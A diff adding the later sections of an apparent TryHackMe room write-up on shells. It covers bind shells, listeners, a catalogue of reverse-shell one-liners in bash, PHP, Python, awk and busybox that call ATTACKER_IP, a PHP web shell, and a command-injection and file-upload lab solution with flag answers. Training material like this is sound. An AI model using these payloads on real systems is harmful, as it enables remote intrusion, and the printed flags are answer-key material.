@@ -158,3 +158,418 @@ Answer: `Netcat`
 
 **Bind Shell**
 
+As the name indicates, a bind shell will bind a port on the compromised system and listen for a connection; when this connection occurs, it exposes the shell session so the attacker can execute commands remotely.
+
+This method can be used when the compromised target does not allow outgoing connections, but it tends to be less popular since it needs to remain active and listen for connections, which can lead to detection.
+
+**How bind shells work**
+
+**Setting Up the Bind Shell on the Target**
+
+Let's create a bind shell. In this case, the attacker can use a command like the one below on the target machine.
+
+`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f`
+
+**Explanation of the Payload**
+
+
+- `rm -f /tmp/f` - This command removes any existing named pipe file located at /tmp/f/. This ensures that the script can create a new named pipe without conflicts.
+
+- `mkfifo /tmp/f` - This command creates a named pipe, or FIFO, at /tmp/f. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.
+
+- `cat /tmp/f` - This command reads data from the named pipe. It waits for input that can be sent through the pipe.
+
+- `| bash -i 2>&1` - The output of cat is piped to a shell instance (bash -i), which allows the attacker to execute commands interactively. The 2>&1 redirects standard error to standard output, ensuring error messages are returned to the attacker.
+
+- `| nc -l 0.0.0.0 8080` - Starts Netcat in listen mode (-l) on all interfaces (0.0.0.0) and port 8080. The shell will be exposed to the attacker once they connect to this port.
+
+- `>/tmp/f` This final part sends the commands' output back into the named pipe, allowing for bidirectional communication.
+
+The command above will listen for incoming connections and expose a bash shell. We need to note that ports below 1024 will require Netcat to be executed with elevated privileges. In this case, using port 8080 will avoid this.
+
+```
+target@tryhackme:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
+```
+
+Once the command is executed, it will wait for an incoming connection, as shown above.
+
+**Attacker Connects to the Bind Shell**
+
+Now that the target machine is waiting for incoming connections, we can use Netcat again with the following command to connect.
+
+`nc -nv TARGET_IP 8080`
+
+ **Explanation of the command**
+
+- `nc` - This invokes Netcat, which establishes the connection to the target.
+
+- `-n` - Disables DNS resolution, allowing Netcat to operate faster and avoid unnecessary lookups.
+
+- `-v` - Verbose mode provides detailed output of the connection process, such as when the connection is established.
+
+- `TARGET_IP` - The IP address of the target machine where the bind shell is running.
+
+- `8080` - The port number on which the bind shell listens.
+
+**Attacker Terminal (After Connection)**
+
+```
+attacker@kali:~$ nc -nv 10.10.13.37 8080 
+(UNKNOWN) [10.10.13.37] 8080 (http-alt) open
+target@tryhackme:~$
+```
+After connecting, we can get a shell, as shown above, and execute commands.
+
+**Answer the questions below**
+
+1. _What type of shell opens a specific port on the target for incoming connections from the attacker?_
+
+Answer: `Bind Shell`
+
+2. _Listening below which port number requires root access or privileged permissions?_
+
+Answer: `1024`
+
+-----------------------------------------------------------------------------------------------------------------------------------------------
+
+**Module 5: Shell Listeners**
+
+As we learned in previous tasks, a reverse shell will connect from the compromised target to the attacker's machine. A utility like Netcat will handle the connection and allow the attacker to interact with the exposed shell, but Netcat is not the only utility that will allow us to do that.
+
+Let's explore some tools that can be used as listeners to interact with an incoming shell.
+
+**Rlwrap**
+
+
+It is a small utility that uses the GNU readline library to provide editing keyboard and history.
+
+**Usage Example (Enhancing a Netcat Shell With Rlwrap)**
+
+```
+attacker@kali:~$ rlwrap nc -lvnp 443
+listening on [any] 443 ...
+```
+
+This wraps `nc` with `rlwrap`, allowing the use of features like arrow keys and history for better interaction.
+
+**Ncat**
+
+Ncat is an improved version of Netcat distributed by the NMAP project. It provides extra features, like encryption (SSL).
+
+**Usage Example (Listening for Reverse Shells)**
+
+```
+attacker@kali:~$ ncat -lvnp 4444
+Ncat: Version 7.94SVN ( https://nmap.org/ncat )
+Ncat: Listening on [::]:443
+Ncat: Listening on 0.0.0.0:443
+```
+
+**Usage Example (Listening for Reverse Shells with SSL)**
+
+```
+attacker@kali:~$ ncat --ssl -lvnp 4444
+Ncat: Version 7.94SVN ( https://nmap.org/ncat )
+Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
+Ncat: SHA-1 fingerprint: B7AC F999 7FB0 9FF9 14F5 5F12 6A17 B0DC B094 AB7F
+Ncat: Listening on [::]:443
+Ncat: Listening on 0.0.0.0:443
+```
+
+The `--ssl` option enables SSL encryption for the listener.
+
+**Socat**
+
+It is a utility that allows you to create a socket connection between two data sources, in this case, two different hosts.
+
+**Default Usage Example (Listening for Reverse Shell):**
+
+```
+attacker@kali:~$ socat -d -d TCP-LISTEN:443 STDOUT
+2024/09/23 15:44:38 socat[41135] N listening on AF=2 0.0.0.0:443
+```
+
+The command above used the `-d` option to enable verbose output; using it again `(-d -d)` will increase the verbosity of the commands. The `TCP-LISTEN:443` option creates a TCP listener on port 443, establishing a server socket for incoming connections. Finally, the STDOUT option directs any incoming data to the terminal.
+
+**Answer the questions below**
+
+1. _Which flexible networking tool allows you to create a socket connection between two data sources?_
+
+Answer: `socat`
+
+2. _Which command-line utility provides readline-style editing and command history for programs that lack it, enhancing the interaction with a shell listener?_
+
+Answer: `rlwrap`
+
+3. _What is the improved version of Netcat distributed with the Nmap project that offers additional features like SSL support for listening to encrypted shells?_
+
+Answer: `ncat`
+
+-----------------------------------------------------------------------------------------------------------------------------------------------
+
+**Module 6: Shell Payloads**
+
+A Shell Payload can be a command or script that exposes the shell to an incoming connection in the case of a bind shell or a send connection in the case of a reverse shell.
+
+Let's explore some of these payloads that can be used in the Linux OS to expose the shell through the most popular reverse shell.
+
+**Bash**
+
+**Normal Bash Reverse Shell**
+
+`target@tryhackme:~$ bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1`
+
+This reverse shell initiates an interactive bash shell that redirects input and output through a TCP connection to the attacker's IP (ATTACKER_IP) on port 443. The >& operator combines both standard output and standard error.
+
+**Bash Read Line Reverse Shell**
+
+`target@tryhackme:~$ exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done`
+
+This reverse shell creates a new file descriptor (5 in this case)  and connects to a TCP socket. It will read and execute commands from the socket, sending the output back through the same socket.
+
+**Bash With File Descriptor 196 Reverse Shell**
+
+`target@tryhackme:~$ 0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196`
+
+This reverse shell uses a file descriptor (196 in this case) to establish a TCP connection. It allows the shell to read commands from the network and send output back through the same connection.
+
+**Bash With File Descriptor 5 Reverse Shell**
+
+
+`target@tryhackme:~$ bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5`
+
+Similar to the first example, this command opens a shell (bash -i), but it uses file descriptor 5 for input and output, enabling an interactive session over the TCP connection.
+
+**PHP**
+
+**PHP Reverse Shell Using the exec Function**
+
+`target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'`
+
+This reverse shell creates a socket connection to the attacker's IP on port 443 and uses the exec function to execute a shell, redirecting standard input and output.
+
+**PHP Reverse Shell Using the shell_exec Function**
+
+`target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'`
+
+Similar to the previous command, but uses the shell_exec function.
+
+**PHP Reverse Shell Using the system Function**
+
+`target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'`
+
+This reverse shell employs the system function, which executes the command and outputs the result to the browser.
+
+**PHP Reverse Shell Using the passthru Function**
+
+`target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'`
+
+The passthru function executes a command and sends raw output back to the browser. This is useful when working with binary data.
+
+**PHP Reverse Shell Using the popen Function**
+
+`target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'`
+
+This reverse shell uses popen to open a process file pointer, allowing the shell to be executed.
+
+**Python**
+
+﻿Please note, the following snippets below require using python -c to run, indicated by the placeholder PY-C
+
+ **Python Reverse Shell by Exporting Environment Variables**
+
+ `target@tryhackme:~$ export RHOST="ATTACKER_IP"; export RPORT=443; PY-C 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'`
+
+ This reverse shell sets the remote host and port as environment variables, creates a socket connection, and duplicates the socket file descriptor for standard input/output.
+
+ **Python Reverse Shell Using the subprocess Module**
+
+ `target@tryhackme:~$ PY-C 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'`
+
+ This reverse shell uses the subprocess module to spawn a shell and set up a similar environment as the Python Reverse Shell by Exporting Environment Variables command.
+
+ **Short Python Reverse Shell**
+
+ `PY-C 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'`
+
+ This reverse shell creates a socket (s), connects to the attacker, and redirects standard input, output, and error to the socket using os.dup2().
+
+ **Others**
+
+ **Telnet**
+
+ `target@tryhackme:~$ TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF`
+
+ This reverse shell creates a named pipe using mkfifo and connects to the attacker via Telnet on IP ATTACKER_IP and port 443. 
+
+ **AWK**
+
+ `target@tryhackme:~$ awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`
+
+ This reverse shell uses AWK’s built-in TCP capabilities to connect to ATTACKER_IP:443. It reads commands from the attacker and executes them. Then it sends the results back over the same TCP connection.
+
+ **BusyBox**
+
+ `target@tryhackme:~$ busybox nc ATTACKER_IP 443 -e sh`
+
+ This BusyBox reverse shell uses Netcat (nc) to connect to the attacker at ATTACKER_IP:443. Once connected, it executes /bin/sh, exposing the command line to the attacker.
+
+ **Answer the questions below**
+
+ 1. _Which Python module is commonly used for managing shell commands and establishing reverse shell connections in security assessments?_
+
+Answer: `subprocess`
+
+ 2. _What shell payload method in a common scripting language uses the `exec`, `shell_exec`, `system`, `passthru`, and `popen` functions to execute commands remotely through a TCP connection?_
+
+Answer: `php`
+
+ 3. _Which scripting language can use a reverse shell by exporting environment variables and creating a socket connection?_
+
+Answer: `python`
+
+-----------------------------------------------------------------------------------------------------------------------------------------------
+
+**Module 7: Web Shell**
+
+A web shell is a script written in a language supported by a compromised web server that executes commands through the web server itself. A web shell is usually a file containing the code that executes commands and handles files. It can be hidden within a compromised web application or service, making it difficult to detect and very popular among attackers.
+
+Web shells can be written in several languages supported by web servers, like PHP, ASP, JSP, and even simple CGI scripts. 
+
+**Example PHP Web Shell**
+
+Let’s look at an example PHP web shell to understand how this process works:
+
+```
+<?php
+if (isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?>
+```
+
+ The above shell can be saved into a file with the PHP extension, like shell.php, and then uploaded into the web server by the attacker by exploiting vulnerabilities such as [Unrestricted File Upload](https://tryhackme.com/r/room/uploadvulns), [File Inclusion](https://tryhackme.com/r/room/fileinc), [Command Injection](https://tryhackme.com/r/room/oscommandinjection), among others, or by gaining unauthorized access to it.  
+
+  After the web shell is deployed in the server, it can be accessed through the URL where the web shell is hosted, in this example http://victim.com/uploads/shell.php. As we observed from the code in shell.php, we need to provide a GET method and the value of the variable cmd, which should contain the command the attacker wants to execute. For example, if we want to execute the command whoami the request to the 
+  
+URL should be:
+`http://victim.com/uploads/shell.php?cmd=whoami`
+
+The above will execute the command whoami and display the result in the web browser. 
+
+**Existing Web Shells Available Online**
+
+The power of supported languages by the web servers can result in web shells with lots of functionality and avoid detection at the same time. Let's explore some of the most popular web shells that can be found online 
+
+ [p0wny-shell](https://github.com/flozz/p0wny-shell) - A minimalistic single-file PHP web shell that allows remote command execution. 
+
+ <img width="863" height="654" alt="image" src="https://github.com/user-attachments/assets/0b1eaf85-aa82-4e1f-8c31-ba1e1ec576e6" />
+
+ [b374k shell](https://github.com/b374k/b374k) - A more feature-rich PHP web shell with file management and command execution, among other functionalities.
+
+ <img width="1380" height="545" alt="image" src="https://github.com/user-attachments/assets/39a9b307-0944-426c-9dff-63f490faa5f4" />
+
+ [c99 shell](https://www.r57shell.net/single.php?id=13) - A well-known and robust PHP web shell with extensive functionality. 
+
+ <img width="1432" height="609" alt="image" src="https://github.com/user-attachments/assets/15a1ccc5-8a06-426a-8203-7067c5b64314" />
+
+You can find more web shells at: [https://www.r57shell.net/index.php](https://www.r57shell.net/index.php).
+
+**Answer the questions below**
+
+1. _What vulnerability type allows attackers to upload a malicious script by failing to restrict file types?_
+
+Answer: `Unrestricted File Upload`
+
+2. _What is a malicious script uploaded to a vulnerable web application to gain unauthorized access?_
+
+Answer: `Web Shell`
+
+-----------------------------------------------------------------------------------------------------------------------------------------------
+
+**Module 8: Practical Task**
+
+Now that we have learned about the different types of reverse shells, let's test our knowledge with a practical exercise, and let's get the flag in the format THM{} from the vulnerable web server. Click on the Start Machine button to start the challenge. After that, it will be accessible on the following URLs:
+
+- MACHINE_IP:8080 hosts the landing page
+
+- MACHINE_IP:8081 hosts the web application that is vulnerable to command injection.
+
+- MACHINE_IP:8082 hosts the web application that is vulnerable to an unrestricted file upload.
+
+You can access the above using the AttackBox, which will display on a split screen, or you can use your own access through the VPN.
+
+Note: Please allow 2 minutes for the VM to fully boot up.
+
+**Answer the questions below**
+
+1. _Using a reverse or bind shell, exploit the command injection vulnerability to get a shell. What is the content of the flag saved in the / directory?_
+
+Answer: `THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}`
+
+**_Explanation:_**
+
+We visit MACHINE_IP:8081
+
+We can execute command within `; ;` 
+
+So we now try to see what's inside the `/` directory by using the command `;ls /;`
+
+<img width="1031" height="385" alt="image" src="https://github.com/user-attachments/assets/c722633e-905e-48b0-9606-b552627d41ae" />
+
+We can see a file called `flag.txt` and we open it by `;cat /flag.txt;`
+
+<img width="1021" height="265" alt="image" src="https://github.com/user-attachments/assets/29f32080-017a-4a03-a656-c362156398b6" />
+
+2. _Using a web shell, exploit the unrestricted file upload vulnerability and get a shell. What is the content of the flag saved in the / directory?_
+
+Answer: `THM{202bb14ed12120b31300cfbbbdd35998786b44e5}`
+
+**_Explanation:_**
+
+We visit MACHINE_IP:8082/
+
+And now we can see that any file can be uploaded 
+
+<img width="1918" height="1004" alt="image" src="https://github.com/user-attachments/assets/f6d55295-0c2f-4465-ac9f-07c88290b970" />
+
+
+So we create a file on our local machine named shell.php with the code
+
+```
+<?php
+echo file_get_contents('/flag.txt');
+?>
+```
+
+<img width="906" height="175" alt="image" src="https://github.com/user-attachments/assets/0ecb51a6-82d8-4433-aa40-bf2573ac598b" />
+
+Now we will upload this shell.php to the web application
+
+<img width="1914" height="927" alt="image" src="https://github.com/user-attachments/assets/35fd693d-eaba-4b7b-9a88-445c462c5fca" />
+
+Once the file has been uploaded we can see something like 
+
+<img width="1920" height="929" alt="image" src="https://github.com/user-attachments/assets/18e8d801-cfb4-44d5-bae5-88fa5bf9e0ca" />
+
+Now we will visit MACHINE_IP:8082/uploads/shell.php and see our flag
+
+<img width="749" height="152" alt="image" src="https://github.com/user-attachments/assets/a5e642bb-4d10-4217-92ac-fbf9d22f71f8" />
+
+-----------------------------------------------------------------------------------------------------------------------------------------------
+
+**Module 9: Conclusion**
+
+In this room, we learned about Reverse Shells, Bind Shells, and Web Shells, how they are critical for attackers, penetration testers, and defenders, and how to identify them.
+
+Reverse Shells establish a connection from a compromised machine back to an attacker's system. Bind Shells, on the other hand, listen for incoming connections on a compromised machine, and Web Shells offer attackers a unique avenue for exploiting vulnerabilities in web applications.
+
+Understanding shells is critical for security professionals to either perform penetration testing exercises or to identify and defend systems.
+
+**Answer the questions below**
+
+1. _I have successfully completed the room, and I now understand how Reverse Shells, Bind Shells, and Web Shells work!_
+
+Answer: No answer needed
+
+-----------------------------------------------------------------------------------------------------------------------------------------------
